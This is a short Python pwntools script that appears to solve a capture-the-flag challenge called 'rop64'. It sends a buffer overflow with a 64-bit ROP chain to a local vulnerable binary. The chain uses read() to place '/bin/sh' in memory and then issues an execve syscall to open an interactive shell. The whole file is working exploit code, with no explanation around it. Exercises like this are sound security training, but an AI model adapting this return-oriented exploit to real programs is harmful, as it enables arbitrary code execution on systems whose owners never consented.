from pwn import *

path = "/problems/rop64_4_18c87449526a4f8880329091abffb68f"
elf = ELF("{}/vuln".format(path))
sock = process("{}/vuln".format(path), cwd=path)
#elf = ELF("./vuln")
#sock = process("./vuln")
rop_pop_rdi = 0x00400686
rop_pop_rsi = 0x004100d3
rop_pop_rdx = 0x0044bf16
rop_pop_rax = 0x004156f4
rop_syscall = 0x0040123c
addr = 0x6b6000 + 0x400

payload = "A" * 0x18
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(addr)
payload += p64(rop_pop_rdx)
payload += p64(8)
payload += p64(elf.symbols['read'])
payload += p64(rop_pop_rdi)
payload += p64(addr)
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
assert '\n' not in payload
sock.sendline(payload)
sock.send("/bin/sh\x00")

sock.interactive()
